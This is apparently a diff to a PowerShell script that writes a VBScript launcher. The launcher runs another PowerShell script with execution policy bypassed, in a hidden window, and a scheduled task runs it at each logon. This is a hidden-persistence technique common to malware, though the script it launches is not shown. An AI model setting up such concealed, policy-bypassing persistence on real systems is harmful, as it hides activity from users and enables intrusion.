@@ -63,14 +63,15 @@ $secondaryScript | Out-File -FilePath $scriptPath -Encoding UTF8
 Write-Host "Secondary script created at $scriptPath"
 
 # Create VBScript launcher
+$escapedScriptPath = $scriptPath -replace '\\', '\\\\'  # escape backslashes for safety
 $vbscript = @"
 Set objShell = CreateObject("Wscript.Shell")
-objShell.Run "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"", 0, False
+objShell.Run "powershell.exe -ExecutionPolicy Bypass -File ""$escapedScriptPath""", 0, False
 "@
-
 $vbscriptPath = "C:\launch-hidden.vbs"
 $vbscript | Out-File -FilePath $vbscriptPath -Encoding ASCII
 Write-Host "VBScript launcher created at $vbscriptPath"
+
 
 # Schedule the VBScript launcher to run completely hidden at next login
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbscriptPath`""
